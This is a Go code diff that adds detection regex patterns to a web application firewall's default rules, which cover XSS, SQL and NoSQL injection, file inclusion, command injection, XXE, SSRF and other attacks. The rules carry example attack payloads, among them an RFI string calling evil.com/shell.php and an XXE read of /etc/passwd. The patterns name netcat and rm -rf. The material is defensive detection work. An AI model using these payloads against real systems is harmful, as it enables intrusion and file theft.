@@ -2,14 +2,15 @@ package api
 
 // DefaultRule rappresenta una regola di default hardcoded nel WAF
 type DefaultRule struct {
-	ID          string `json:"id"`
-	Name        string `json:"name"`
-	Type        string `json:"type"`
-	Description string `json:"description"`
-	Severity    string `json:"severity"`
+	ID          string   `json:"id"`
+	Name        string   `json:"name"`
+	Type        string   `json:"type"`
+	Description string   `json:"description"`
+	Severity    string   `json:"severity"`
+	Pattern     string   `json:"pattern"`
 	Examples    []string `json:"examples"`
-	IsDefault   bool   `json:"is_default"`
-	Enabled     bool   `json:"enabled"`
+	IsDefault   bool     `json:"is_default"`
+	Enabled     bool     `json:"enabled"`
 }
 
 // GetDefaultRules returns all default rules implemented in the WAF
@@ -17,12 +18,13 @@ type DefaultRule struct {
 func GetDefaultRules() []DefaultRule {
 	return []DefaultRule{
 		{
-			ID:        "default_xss",
-			Name:      "Cross-Site Scripting (XSS)",
-			Type:      "XSS",
-			Severity:  "HIGH",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_xss",
+			Name:        "Cross-Site Scripting (XSS)",
+			Type:        "XSS",
+			Severity:    "HIGH",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "<script.*?</script>|javascript:|on\\w+\\s*=|eval\\s*\\(|setTimeout\\s*\\(|setInterval\\s*\\(|window\\.location|document\\.location|innerHTML\\s*=",
 			Description: "Blocks Cross-Site Scripting (XSS) attempts. Monitors script tags, event handlers, dangerous JS functions and encoding.",
 			Examples: []string{
 				"<script>alert('xss')</script>",
@@ -34,12 +36,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_sqli",
-			Name:      "SQL Injection",
-			Type:      "SQL_INJECTION",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_sqli",
+			Name:        "SQL Injection",
+			Type:        "SQL_INJECTION",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "\\b(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|SCRIPT)\\b|' OR '|' OR 1=|--|/\\*|\\*/|xp_|sp_|SLEEP\\s*\\(|BENCHMARK\\s*\\(",
 			Description: "Blocks SQL Injection attempts. Includes patterns for UNION-based, boolean-based, time-based blind and stacked queries.",
 			Examples: []string{
 				"' OR '1'='1",
@@ -53,12 +56,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_nosql",
-			Name:      "NoSQL Injection",
-			Type:      "NOSQL_INJECTION",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_nosql",
+			Name:        "NoSQL Injection",
+			Type:        "NOSQL_INJECTION",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "\\$ne|\\$gt|\\$lt|\\$regex|\\$where|\\$or|\\[\\$|\\]\\s*=|db\\..+\\.find|mongodb:|nosql",
 			Description: "Blocks NoSQL Injection attempts. Monitors MongoDB operators and query injection.",
 			Examples: []string{
 				"{\"$ne\": null}",
@@ -70,12 +74,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_lfi",
-			Name:      "Local File Inclusion (LFI)",
-			Type:      "LFI",
-			Severity:  "HIGH",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_lfi",
+			Name:        "Local File Inclusion (LFI)",
+			Type:        "LFI",
+			Severity:    "HIGH",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "\\.\\./|\\.\\.\\\\|%2e%2e|php://|file://|zip://|phar://|glob://|data://|%00|null byte",
 			Description: "Blocks Local File Inclusion attempts. Monitors path traversal and local file inclusions.",
 			Examples: []string{
 				"../../../etc/passwd",
@@ -86,12 +91,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_path_traversal",
-			Name:      "Path Traversal",
-			Type:      "PATH_TRAVERSAL",
-			Severity:  "HIGH",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_path_traversal",
+			Name:        "Path Traversal",
+			Type:        "PATH_TRAVERSAL",
+			Severity:    "HIGH",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "\\.\\./|\\.\\.\\\\|%2e%2e%2f|%5c%5c|etc/passwd|windows/system32",
 			Description: "Blocks path traversal attempts to access unauthorized directories.",
 			Examples: []string{
 				"../../../etc/passwd",
@@ -100,12 +106,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_rfi",
-			Name:      "Remote File Inclusion (RFI)",
-			Type:      "RFI",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_rfi",
+			Name:        "Remote File Inclusion (RFI)",
+			Type:        "RFI",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "http://|https://|ftp://|file://|php://|data://|include|require|eval",
 			Description: "Blocks Remote File Inclusion attempts. Prevents inclusion of remote files.",
 			Examples: []string{
 				"?file=http://evil.com/shell.php",
@@ -114,12 +121,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_cmd_injection",
-			Name:      "Command Injection",
-			Type:      "COMMAND_INJECTION",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_cmd_injection",
+			Name:        "Command Injection",
+			Type:        "COMMAND_INJECTION",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     ";|\\||&|`|\\$\\(|backtick|chmod|chown|whoami|rm -rf|cat /etc|ls -la|nc |netcat",
 			Description: "Blocks Command Injection attempts. Prevents system command execution.",
 			Examples: []string{
 				"; ls -la",
@@ -132,12 +140,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_xxe",
-			Name:      "XML External Entity (XXE)",
-			Type:      "XXE",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_xxe",
+			Name:        "XML External Entity (XXE)",
+			Type:        "XXE",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "<!DOCTYPE|<!ENTITY|SYSTEM|PUBLIC|xml|CDATA|XSLT|DOCTYPE.*SYSTEM",
 			Description: "Blocks XXE attacks. Prevents access to local files via XML.",
 			Examples: []string{
 				"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
@@ -145,12 +154,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_ssrf",
-			Name:      "Server-Side Request Forgery (SSRF)",
-			Type:      "SSRF",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_ssrf",
+			Name:        "Server-Side Request Forgery (SSRF)",
+			Type:        "SSRF",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "localhost|127\\.0\\.0\\.1|169\\.254\\.169\\.254|internal|private|10\\.|172\\.|192\\.168\\.|gopher://",
 			Description: "Blocks SSRF attempts. Prevents access to internal server resources.",
 			Examples: []string{
 				"http://localhost:8080/admin",
@@ -160,12 +170,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_ldap",
-			Name:      "LDAP Injection",
-			Type:      "LDAP_INJECTION",
-			Severity:  "HIGH",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_ldap",
+			Name:        "LDAP Injection",
+			Type:        "LDAP_INJECTION",
+			Severity:    "HIGH",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "\\*\\)|\\||&|\\(|\\)|ldap|cn=|dc=|uid=|filter=",
 			Description: "Blocks LDAP Injection attempts. Protects against manipulated LDAP queries.",
 			Examples: []string{
 				"*)(uid=*",
@@ -174,12 +185,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_ssti",
-			Name:      "Server-Side Template Injection (SSTI)",
-			Type:      "SSTI",
-			Severity:  "CRITICAL",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_ssti",
+			Name:        "Server-Side Template Injection (SSTI)",
+			Type:        "SSTI",
+			Severity:    "CRITICAL",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "{{|{%|<%|#{|\\$\\{|\\*\\{|jinja|mako|erb|thymeleaf|template",
 			Description: "Blocks SSTI attempts. Protects Jinja2, ERB, Thymeleaf and other template engines.",
 			Examples: []string{
 				"{{ 7 * 7 }}",
@@ -190,12 +202,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_resp_split",
-			Name:      "HTTP Response Splitting",
-			Type:      "HTTP_RESPONSE_SPLITTING",
-			Severity:  "HIGH",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_resp_split",
+			Name:        "HTTP Response Splitting",
+			Type:        "HTTP_RESPONSE_SPLITTING",
+			Severity:    "HIGH",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "\\r\\n|%0d%0a|%0a|\\\\r\\\\n|CR LF|\\n\\r",
 			Description: "Blocks Response Splitting attempts. Prevents header injection.",
 			Examples: []string{
 				"HTTP/1.1 200 OK\\r\\n\\r\\n",
@@ -204,12 +217,13 @@ func GetDefaultRules() []DefaultRule {
 			},
 		},
 		{
-			ID:        "default_proto_pollution",
-			Name:      "Prototype Pollution",
-			Type:      "PROTOTYPE_POLLUTION",
-			Severity:  "HIGH",
-			IsDefault: true,
-			Enabled:   true,
+			ID:          "default_proto_pollution",
+			Name:        "Prototype Pollution",
+			Type:        "PROTOTYPE_POLLUTION",
+			Severity:    "HIGH",
+			IsDefault:   true,
+			Enabled:     true,
+			Pattern:     "__proto__|constructor|prototype|\\[.*\\]\\s*=",
 			Description: "Blocks Prototype Pollution attempts. Protects JavaScript applications.",
 			Examples: []string{
 				"?__proto__[isAdmin]=true",
